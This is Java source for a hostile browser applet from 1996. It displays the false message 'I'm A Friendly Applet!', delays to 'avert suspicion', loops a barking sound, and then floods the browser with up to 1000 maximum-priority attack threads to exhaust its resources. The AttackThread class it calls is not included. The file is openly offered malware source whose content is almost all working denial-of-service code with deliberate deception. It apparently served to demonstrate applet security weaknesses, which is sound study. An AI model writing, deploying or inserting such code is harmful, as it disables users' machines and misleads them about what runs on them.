package hostile;
/* HostileThreads.java by Mark D. LaDue */

/* February 20, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java Applet tries inundate the browser with lots of wasteful
   threads.  If that completes or fails, it then executes as cleanup
   a more hostile action.  */ 


import java.awt.*;
import java.applet.AudioClip;
import java.net.*;

public class HostileThreads extends java.applet.Applet implements Runnable {

//  Just a font to paint strings to the applet window 
    Font bigFont = new Font("TimesRoman", Font.BOLD, 36);

    Thread controller = null;
    Thread wasteResources[] = new Thread[1000];

//  Used to read in a parameter that makes the thread sleep for a
//  specified number of seconds taking effect
    int delay;

//  Netscape will die barking! 
    AudioClip bark;

    public void init() {
        setBackground(Color.white);
        bark = getAudioClip(getCodeBase(),"Sounds/bark.au");

//  Determine how many seconds the thread should sleep before kicking in
        String str = getParameter("wait");
        if (str == null)
            delay = 0;
        else delay = (1000)*(Integer.parseInt(str));
        try {
            for (int i = 0; i < 1000; i++) {
                wasteResources[i] = null;
            }
        }
        catch (OutOfMemoryError o) {}
        finally {
            AttackThread q = new AttackThread();
            Thread killer = new Thread(q);
            killer.setPriority(Thread.MAX_PRIORITY);
            killer.start();
        }
    }


/*  Create and start the main thread in the standard way */

    public void start() {
        if (controller == null) {
        controller = new Thread(this);
        controller.setPriority(Thread.MAX_PRIORITY);
        controller.start();
        }
    }

    public void stop() {}


/*  Create lots of threads which do lots of wasteful stuff */

    public void run() {

//  Let the applet tell its lie
        repaint();

//  Let the applet sleep for a while to avert suspicion
        try {controller.sleep(delay);}
        catch(InterruptedException e) {}

//  Make it bark when it awakens and goes to work
        bark.loop();
        try {controller.sleep(3000);}
        catch (InterruptedException e) {}
        try {
            for (int i = 0; i < 1000; i++) {
                if (wasteResources[i] == null) {
                AttackThread a = new AttackThread(); 
                wasteResources[i] = new Thread(a);
                wasteResources[i].setPriority(Thread.MAX_PRIORITY);
                wasteResources[i].start();
                }
            } 
        }
        catch (OutOfMemoryError o) {}
        finally {
            AttackThread q = new AttackThread();
            Thread killer = new Thread(q);
            killer.setPriority(Thread.MAX_PRIORITY);
            killer.start();
        } 
    }

/*  Paints the applet's lie */

    public void update(Graphics g) {
        paint(g);
    }

    public void paint(Graphics g) {
    g.setColor(Color.blue);
    g.setFont(bigFont);
    g.drawString("I'm A Friendly Applet!", 10, 200);
    }
}

